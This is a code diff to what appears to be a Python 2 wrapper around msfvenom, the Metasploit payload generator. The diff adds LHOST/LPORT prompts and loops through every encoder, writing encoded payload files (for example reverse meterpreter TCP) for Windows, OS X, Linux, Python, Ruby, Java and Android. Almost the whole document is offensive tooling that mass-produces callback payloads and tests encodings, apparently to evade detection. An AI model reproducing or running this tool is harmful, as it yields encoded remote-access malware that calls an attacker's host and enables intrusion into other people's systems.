@@ -17,7 +17,7 @@ text_Starting = colored('[*] Beginning tests against all 39 encoders','yellow',a
 text_Finished = colored('[*] Encoder tests completed, please check console output','green',attrs=['bold'])
 text_Successful = colored('[+] Successful Encoding Detected','green',attrs=['bold'])
 encoder_test_results = '/root/EZPZ/payloads/encoder_test_results.txt'
-
+test_encoder_dir = '/root/EZPZ/payloads/tester'
 # #def #write_encoder_success_file():
 #     f = open(encoder_test_results,'w')
 #     # f.write(sys.__stdout__)
@@ -185,7 +185,8 @@ def Windows_INLINE():
         )
         print ("\n\t".join(opt_List))
         opt_Choice = str(raw_input("Enter a payload shown: "))
-
+        LHOST_Set = str(raw_input("Enter LHOST: "))
+        LPORT_Set = str(raw_input("Enter LPORT: "))
         if opt_Choice in opt_Dict:
             # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
             # print colored('Please answer the following questions','red','on_white')
@@ -194,15 +195,13 @@ def Windows_INLINE():
             bad_Bytes = "x00"
             for key in encoder_Dict:
                 encoder_Set = encoder_Dict[key]
+                encoder_Name = encoder_Set.replace('/','_')
                 encoder_Iterations = '1'
-                cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-                """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+                cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.exe
+                """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
                 text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
                 print text
                 os.system(cmd_String)
-                #write_encoder_success_file()
-                #os.system(cmd_String + ' >> ' + encoder_test_results)
-            ##check_encoder_success()
             print text_Finished
 
         else:
@@ -223,6 +222,8 @@ def Windows_STAGED():
         )
         print ("\n\t".join(opt_List))
         opt_Choice = str(raw_input("Enter a payload shown: "))
+        LHOST_Set = str(raw_input("Enter LHOST: "))
+        LPORT_Set = str(raw_input("Enter LPORT: "))
 
         if opt_Choice in opt_Dict:
             # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
@@ -232,13 +233,13 @@ def Windows_STAGED():
             bad_Bytes = "x00"
             for key in encoder_Dict:
                 encoder_Set = encoder_Dict[key]
+                encoder_Name = encoder_Set.replace('/','_')
                 encoder_Iterations = '1'
-                cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-                """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+                cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.exe
+                """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
                 text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
                 print text
                 os.system(cmd_String)
-                #os.system(cmd_String + ' >> ' + encoder_test_results)
 
             ##check_encoder_success()
             text_Finished = colored('[*]Encoder tests completed, please check console output','green',attrs=['bold'])
@@ -283,6 +284,8 @@ def OSX_PPC():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -292,13 +295,13 @@ def OSX_PPC():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.macho
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
-            #os.system(cmd_String + ' >> ' + encoder_test_results)
 
         text_Finished = colored('[*]Encoder tests completed, please check console output','green',attrs=['bold'])
         print text_Finished
@@ -321,6 +324,8 @@ def OSX_x86():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -330,9 +335,10 @@ def OSX_x86():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.macho
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -376,6 +382,8 @@ def Linux_STAGED():
     }
 
     opt_Choice = str(raw_input("Press 1 to create a reverse meterpreter TCP payload: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -384,9 +392,10 @@ def Linux_STAGED():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.elf
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -417,6 +426,8 @@ def Python_INLINE():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -425,9 +436,10 @@ def Python_INLINE():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.py
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -449,6 +461,8 @@ def Python_STAGED():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -457,9 +471,10 @@ def Python_STAGED():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.py
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -500,6 +515,8 @@ def Ruby_INLINE():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -508,9 +525,10 @@ def Ruby_INLINE():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.rb
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -543,6 +561,8 @@ def Java_STAGED():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -551,9 +571,10 @@ def Java_STAGED():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.jar
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -581,6 +602,8 @@ def Android_INLINE():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -589,9 +612,10 @@ def Android_INLINE():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.apk
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -611,6 +635,9 @@ def Android_STAGED():
     )
     print ("\n\t".join(opt_List))
     opt_Choice = str(raw_input("Enter a payload shown: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
+
     if opt_Choice in opt_Dict:
         # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         # print colored('Please answer the following questions','red','on_white')
@@ -619,9 +646,10 @@ def Android_STAGED():
         bad_Bytes = "x00"
         for key in encoder_Dict:
             encoder_Set = encoder_Dict[key]
+            encoder_Name = encoder_Set.replace('/','_')
             encoder_Iterations = '1'
-            cmd_String = """msfvenom -p %s -e %s -i %s -b "\%s" -o /root/EZPZ/Encoder_Tested
-            """ % (payload_Set,encoder_Set,encoder_Iterations,bad_Bytes)
+            cmd_String = """msfvenom -p %s LHOST=%s LPORT=%s -e %s -i %s -b "\%s" -o %s/Encoder_%s.apk
+            """ % (payload_Set,LHOST_Set,LPORT_Set,encoder_Set,encoder_Iterations,bad_Bytes,test_encoder_dir,encoder_Name)
             text = colored('[+] '+ cmd_String,'red',attrs=['bold'])
             print text
             os.system(cmd_String)
@@ -637,6 +665,8 @@ def Platform_Android():
     print ("\n\t".join(opt_List))
 
     opt_Choice = str(raw_input("Enter a OPTION: "))
+    LHOST_Set = str(raw_input("Enter LHOST: "))
+    LPORT_Set = str(raw_input("Enter LPORT: "))
 
     if opt_Choice == "0":
         main()
